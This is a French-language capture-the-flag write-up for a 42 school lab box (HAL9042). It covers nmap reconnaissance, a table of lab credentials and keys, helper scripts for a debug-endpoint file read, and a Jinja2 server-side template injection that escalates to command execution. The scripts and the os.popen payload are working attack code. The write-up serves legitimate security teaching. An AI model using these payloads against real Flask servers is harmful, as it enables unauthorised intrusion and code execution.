# WRITEUP 2 - Boot2Root - Web Vulnerability #2 - Server Side Template Injection (SSTI)

## Contexte : Box HAL9042, sujet pedagogique de l'Ecole 42
> [!NOTE]
> Les WriteUp1 & WriteUp2 sont rediges depuis un README.md de troubleshoot que j'ai essaye de tenir a jour au fur et a mesure de mon travail sur la box.  

**Tableau recapitulatif de l'application qui est attaquee :**
  
| Categorie              | Element                                        | Details / Valeurs trouvees                                                               |
|------------------------|------------------------------------------------|------------------------------------------------------------------------------------------|
| **Informations Generales** | Nom du systeme                                 | HAL9042 - Evalutation Server(v0.4)                                                       |
|                        | Environnement                                  | `env=development`                                                                        |
|                        | Systeme d'Exploitation                         | Ubuntu                                                                                   |
| **Reseau & IP**            | Adresse IP du serveur                          | 10.0.2.2                                                                                 |
| **Ports & Services**       | Port 5042                                      | Service Web HTTP (HAL9042 Evaluation Server)                                             |
|                        | Port 6060                                      | Service SSH                                                                              |
|                        | Port 8000 (int)                                | Application Python/Gunicorn sur `127.0.0.1:8000`                                         |
|                        | Port 7042 (int)                                | Deamon local `hal9042d` d'evaluation sur `127.0.0.1:7042`                                |
| **Technos Web**            | Stack logicielle                               | Python3, Flask, Jinja2, Gunicorn                                                         |
|                        | Repertoire de l'application                    | `/var/www/hal9042/` (qui contient `app.py`, `config.py`, `venv/`)                        |
| **Endpoints & Routes**     | Routes publiques                               | `/`, `/status`, `/feed`, `/evaluate`, `/appeals`, `/about`, `/update`                      |
|                        | Endpoints & Fichiers de debug                  | `/api/debug` (Local File Inclusion + Command Execution), `static/js/debug.js`            |
|                        | En Tete HTTP specifique                        | `X-Debug-Render: true` (permet de rendre l'injection de template Jinja2 sur `/evaluate`) |
| **Utilisateurs Systeme**   | Comptes Users bash                             | `paco`, `wil`, `sophie`, `ol`                                                            |
|                        | Comptes dedies / services                      | `root`, `hal`, `halrev`                                                                  |
|                        | Comptes utilisateur efface                     | `xavier` (uid 1337)                                                                      |
| **Secrets & Identifiants** | Token Maintenance API                          | `h4l_d3bug_t0k3n_2024`                                                                   |
|                        | Secret Key Flask                               | `hal9042secret`                                                                          |
|                        | ID SSH                                         | `paco` : `Pac0_H4L_dev!`                                                                 |
|                        | Passphrase SSH `sophie`                        | `iloveyou` (fichier: `id_rsa_sophie.enc`)                                                |
|                        | `.key_part`:`ol`                               | `M0ul1n3tt3`                                                                             |
|                        | `.key_part`:`wil`                              | `847_4n0m4l13s`                                                                          |
|                        | `.key_part`:`sophie`                           | `S0ph13_J14`                                                                             |
|                        | `.key_part`:`xavier`                           | `uid1337`                                                                                |
|                        | AES-256 Key pour decrypter `rapport_final.enc` | `380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e`                       |


### PHASE 1 - Reconnaissance / Enumeration:
---
#### 1.ARP
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ arp -a
? (10.0.2.2) at 52:54:00:12:35:02 [ether] on eth0
c2r3p4.42lehavre.fr (10.12.3.4) at 00:be:43:89:f2:1d [ether] on eth1
```
---
#### 2.NMAP
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ nmap -p- 10.0.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 11:31 EDT
Nmap scan report for 10.0.2.2
Host is up (0.00012s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
1337/tcp  open  waste
2049/tcp  open  nfs
4242/tcp  open  vrml-multi-use
4444/tcp  open  krb524
5042/tcp  open  asnaacceler8db
6060/tcp  open  x11
6379/tcp  open  redis
9100/tcp  open  jetdirect
11434/tcp open  unknown
36965/tcp open  unknown
37643/tcp open  unknown
41295/tcp open  unknown
46583/tcp open  unknown
47129/tcp open  unknown
60675/tcp open  unknown
MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.77 seconds
```

```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ nmap -sV -p 22,111,1337,2049,4242,5042,6060,6379,9100,11434,36965,37643,41295,46583,47129,60675 10.0
.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 11:33 EDT
Nmap scan report for 10.0.2.2
Host is up (0.0017s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind    2-4 (RPC #100000)
1337/tcp  open  http       Golang net/http server
2049/tcp  open  nfs_acl    3 (RPC #100227)
4242/tcp  open  http       WSGIServer 0.2 (Python 3.10.12)
5042/tcp  open  http       nginx 1.24.0 (Ubuntu)
6060/tcp  open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
6379/tcp  open  redis      Redis key-value store 6.0.16
9100/tcp  open  jetdirect?
11434/tcp open  http       Golang net/http server
36965/tcp open  fmproduct  1-4 (RPC #1073741824)
37643/tcp open  nlockmgr   1-4 (RPC #100021)
41295/tcp open  mountd     1-3 (RPC #100005)
46583/tcp open  status     1 (RPC #100024)
47129/tcp open  mountd     1-3 (RPC #100005)
60675/tcp open  mountd     1-3 (RPC #100005)
```

**Ce que les scans revelent :** 
| Port   | Service          | Interet                                                  |
|--------|------------------|----------------------------------------------------------|
| `22`     | SSH OpenSSH 8.9  | **Non:** Acces SSH Classique                                 |
| `111`    | rpcbind          | **Non:** Teste, pas d'interet NFS                            |
| `1337`   | HTTP Go          | **Oui:** Pas de droits pour le moment, mais a garder en tete |
| `2049`   | NFS              | **Non:** showmount ne donne pas d'export                     |
| `4242`   | HTTP Python WSGI | **Oui:** `{{'ftpkg-srv'}}` => ? A checker                      |
| `5042`   | nginx -> HTTP    | **Oui:** Application HAL9042                                 |
| `6060`   | SSH OpenSSH      | **Oui:** Service SSH user                                    |
| `6379`   | Redis            | **Oui**                                                      |
| `11434`  | HTTP Go          | **Oui**                                                      |
| `36965+` | RPC/mountd/nlock | **Non:** lien avec NFS mais rien a creuser ici               |
*Merci : [TableGenerator](https://www.tablesgenerator.com/markdown_tables)*  

#### 3.SMTP : 
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ sudo nmap -p 25 --script smtp-enum-users 10.0.2.2          
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 12:07 EDT
Nmap scan report for 10.0.2.2
Host is up (0.00023s latency).

PORT   STATE  SERVICE
25/tcp closed smtp
MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```  
Source : [geeksforgeeks](https://www.geeksforgeeks.org/ethical-hacking/smtp-enumeration/0)

#### 4.DNS : 
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ nmap -sSU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=example.com 10.0.2.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 12:11 EDT
Nmap scan report for 10.0.2.2
Host is up (0.00022s latency).

PORT   STATE         SERVICE
53/tcp closed        domain
53/udp open|filtered domain
| dns-nsec-enum: 
|_  No NSEC records found
MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```
---

### UTILITAIRES 

La phase d'enumeration user a requis les scripts suivant : (rendu possible par les failles exposees ensuite)  

#### 1. `get_file.sh`
- Permet de voir le contenu d'un fichier tant que l'on connait son chemin (execute avec les privileges de `/var/www/hal9042`).

```bash
#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 \"<file_path>\""
    exit 1
fi

FILE="$*"

curl "http://10.0.2.2:5042/api/debug?file=$FILE"
```

#### 2. `post_evaluate.sh`
- A remplir
```bash
#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 \"commande shell\""
    exit 1
fi

COMMAND="$*"

# si vous reutilisez, bien modifier l'ip
curl -s -X POST http://10.0.2.2:5042/evaluate \
    -H "X-Debug-Render: true" \
    --data-urlencode "project_name={{ \"\".__class__.__mro__[1].__subclasses__()[540].__init__.__globals__[\"os\"].popen(\"$COMMAND\").read() }}"
```
---

### PHASE 2 - Attaque sur http://10.0.2.2:5042/evaluate  
#### A. Server Side Template Injection (SSTI)

Dans le code source de `app.py` ce commentaire :  
```html
<!-- debug.js still in /static/js pls remove -->
```  
Nous invite a regarder le contenu de ce fichier.
```js
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.2:5042/api/debug?file=static/js/debug.js
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```

1. Couple a la lecture de `app.py` on comprend qu'il existe une vulnerabilite sur `Jinja2`. C'est un moteur de templating utilise pour generer les pages `html`.  
2. **L'idee** : `<Template prepare> + <entree user> = page generee complete` :
```json
Template : "Project under evalutation: {{name}}"
Entree utilisateur : "Minishell"
Page html generee : "Project under evaluation: Minishell"
```
3. **Dans `app.py`** :
```python
name = request.form.get("project_name", "") or request.args.get("project_name", "")
```  
`name` contient directement l'entree utilisateur.
4. **La vulnerabilite** :
```python
render_template_string("Project under evaluation" + name)
```
```
"Project under evaluation" + <entree_user> => Nouveau template => render_template_string()
```  
  
L'article de [PortSwigger](https://portswigger.net/web-security/server-side-template-injection) sur les `SSTI` decrit ce pattern : *une entree utilisateur est concatenee a une chaine qui devient ensuite le template interprete par le moteur*.

5. `Jinja2` a une syntaxe que l'on doit respecter pour demander au moteur d'evaluer une expression : `{{ ... }}`. [Source](https://jinja.palletsprojects.com/en/stable/templates/)

6. **Confirmation de la vulnerabilite** : Jouons le test de base donne dans l'article precedemment cite de PortSwigger :  
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.2:5042/evaluate \
-H "X-Debug-Render: true" \
-d "project_name={{7*7}}"
Project under evaluation: 49
```
> [!TIP] 
> *Il est essentiel de passer `X-Debug-Render` a `true` pour que le resultat de rendering puisse etre observe*

7. **Class Traversal + RCE** : 
- Pour passer d'une evaluation d'expression simple a une execution de code systeme, on s'appuie sur la reflexion POO de Python.
    - **Acces a la classe parente** : Utilisation de la MRO (Method Resolution Order) depuis une instance basique comme `str` pour remonter jusqu'a la classe racine `object` : `''.__class__.__mro__[1]`
    - **Enumeration des sous classes** : Inspection de l'ensemble des sous classes via `__subclasses__()`
    - **Identification du vecteur d'exec** : `subprocess.Popen` = vect 540
    - **Execution de commande** : Exploitation du dictionnaire `__globals__` pour acceder a `os` et executer les commandes systeme via `os.popen()`
8. **RCE Finale** :
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.2:5042/evaluate   
-H "X-Debug-Render: true"
--data-urlencode "project_name={{ ''.__class__.__mro__[1].__subclasses__()[540].__init__.__globals__['os'].popen('whoami').read() }}"
Project under evaluation: www-data
```
```
Explication requete: 

''.__class__   = str
__mro[1]__     = object (permet de rechercher l'ordre des classes apr enumeration)
__subclasses__ = Toutes les classes python
[INDEX]        = 540 pour popen
__init__       = fonction d'init du module
__globals__    = dictionnaire global
popen()        = processus systeme
read()         = lit la sortie de popen()
```
> [!NOTE] 
> *Le detail du processus de recherche est dispo dans le journal de bord [ici](../utils/LOG_BOOK.md)*